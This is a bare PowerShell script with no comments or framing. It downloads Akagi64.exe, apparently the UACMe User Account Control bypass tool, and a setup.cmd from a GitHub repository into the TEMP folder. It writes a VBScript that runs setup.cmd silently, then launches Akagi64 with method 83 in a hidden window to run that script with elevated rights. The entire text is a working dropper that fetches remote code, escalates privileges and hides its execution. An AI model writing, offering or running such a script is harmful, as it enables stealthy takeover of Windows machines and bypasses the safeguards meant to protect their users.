Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/Akagi64.exe' -OutFile "$env:TEMP\Akagi64.exe" -UseBasicParsing
Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/setup.cmd' -OutFile "$env:TEMP\setup.cmd" -UseBasicParsing

@'
CreateObject("WScript.Shell").Run """C:\Windows\System32\cmd.exe"" /c """ & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\setup.cmd""", 0, False
'@ | Set-Content "$env:TEMP\run.vbs" -Encoding ASCII

Start-Process "$env:TEMP\Akagi64.exe" -ArgumentList "83 wscript.exe `"$env:TEMP\run.vbs`"" -WindowStyle Hidden
